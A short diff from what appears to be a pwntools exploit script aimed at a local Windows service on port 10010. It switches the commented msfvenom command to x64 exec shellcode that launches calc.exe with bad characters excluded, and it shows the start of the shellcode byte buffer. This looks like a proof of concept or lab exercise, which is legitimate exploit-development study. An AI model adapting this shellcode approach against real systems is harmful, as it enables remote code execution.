@@ -8,7 +8,7 @@ c = remote("localhost", 10010)
 context.os='windows'
 context.arch='amd64'
 
-# msfvenom -p windows/exec CMD=calc.exe -f python
+# msfvenom -p windows/x64/exec CMD=calc.exe -f python -b '\x00\x0a\x0d'
 buf =  b""
 buf += b"\x48\x31\xc9\x48\x81\xe9\xdd\xff\xff\xff\x48\x8d\x05"
 buf += b"\xef\xff\xff\xff\x48\xbb\x80\xc8\xf8\x62\x4f\xf7\x0e"
